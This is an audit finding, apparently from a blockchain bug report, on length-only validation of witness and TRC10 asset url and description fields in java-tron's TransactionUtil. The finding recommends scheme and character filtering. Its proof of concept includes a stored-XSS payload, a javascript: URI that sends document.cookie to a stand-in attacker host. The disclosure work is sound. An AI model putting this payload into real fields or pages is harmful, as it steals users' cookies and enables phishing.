### Title
Unsanitized witness/asset `url` and `description` fields enable stored phishing/injection payloads exposed to wallet frontends - (File: actuator/src/main/java/org/tron/core/utils/TransactionUtil.java)

### Summary
`TransactionUtil.validUrl` and `TransactionUtil.validAssetDescription` only enforce a maximum byte-length (256 for URLs, 200 for asset descriptions) and, for URLs, that the byte array is non-empty. Neither performs any scheme/character validation (no `http(s)://` requirement, no HTML/script-tag stripping, no control-character filtering). These functions gate the `url` field of `WitnessCreateContract`/`WitnessUpdateContract` and the `url`/`description` fields of `AssetIssueContract`/`UpdateAssetContract`, all of which are broadcastable by any account holding minimal TRX.

### Finding Description
`WitnessCreateActuator.validate()` and `WitnessUpdateActuator.validate()` call `TransactionUtil.validUrl(contract.getUrl()/getUpdateUrl())` before persisting the value into `WitnessCapsule.setUrl(...)`, which is stored on-chain and served back to clients (e.g. via `GetWitnessList`/JSON-RPC/Wallet query paths) for rendering in wallet UIs and block explorers. Likewise, `AssetIssueActuator.validate()` calls `TransactionUtil.validUrl` and `TransactionUtil.validAssetDescription` for the TRC10 `url`/`description` fields, and `UpdateAssetActuator.validate()` allows any TRC10 issuer to later update these same fields. Because `validBytes` (lines 97-102) only checks `bytes.length <= maxLength`, an attacker can submit `javascript:` URIs, `data:` URIs, or embedded HTML/script payloads as the witness or token URL/description. Any downstream consumer (frontend/wallet/explorer) that renders these fields without independent output-encoding is exposed to stored XSS or can be tricked into rendering a phishing link as if it were the legitimate witness/token website — directly analogous to the Astroport `submit_proposal` finding, where `title`/`description`/`link` fields were only length-checked and not content-sanitized.

### Impact Explanation
Any account (witness candidate or TRC10 asset issuer) can inject unsanitized URL/description content that persists on-chain and is displayed by every wallet/explorer that queries witness or asset metadata, creating a stored phishing/XSS vector that can be used to redirect or defraud end users interacting with the official TRON ecosystem tooling. This matches the "Medium" impact class of the reference finding (deceptive frontend content, not direct fund theft at the contract layer, but persistent and hard to filter downstream).

### Likelihood Explanation
Likelihood is high: submitting a `WitnessCreateContract`, `WitnessUpdateContract`, `AssetIssueContract`, or `UpdateAssetContract` requires only a normal signed transaction from an unprivileged account (with the applicable account-upgrade cost/asset-issue fee), with no special permission or governance approval needed, and the validation path performs no content filtering beyond length.

### Recommendation
Extend `TransactionUtil.validUrl` and `TransactionUtil.validAssetDescription` (and any similarly-gated free-text field) to enforce a restricted character set or scheme allow-list (e.g., require `http://`/`https://` prefix for URLs, reject control characters and angle brackets `<`/`>` for both fields), mirroring the fix approach used for the Astroport `submit_proposal` fields. Because full HTML-encoding is a frontend responsibility outside this repo, the on-chain actuator layer should still reject the most dangerous byte sequences (script tags, `javascript:`/`data:` schemes) at `validate()` time in `WitnessCreateActuator`, `WitnessUpdateActuator`, `AssetIssueActuator`, and `UpdateAssetActuator`.

### Proof of Concept
1. Create an account and fund it enough to cover `AccountUpgradeCost`.
2. Broadcast a `WitnessCreateContract` with `url = "javascript:fetch('https://evil.example/steal?c='+document.cookie)"` (≤256 bytes, non-empty) — `WitnessCreateActuator.validate()` at [4](#0-3)  passes because `validUrl` only checks length/non-emptiness.
3. The malicious `url` is persisted via `createWitness`/`witnessStore.put` and is queryable by any wallet/explorer through the standard `GetWitnessList`/`ListWitnesses` API, where it may be rendered as a clickable "official website" link, exposing end users to phishing or script execution depending on the client's rendering behavior.
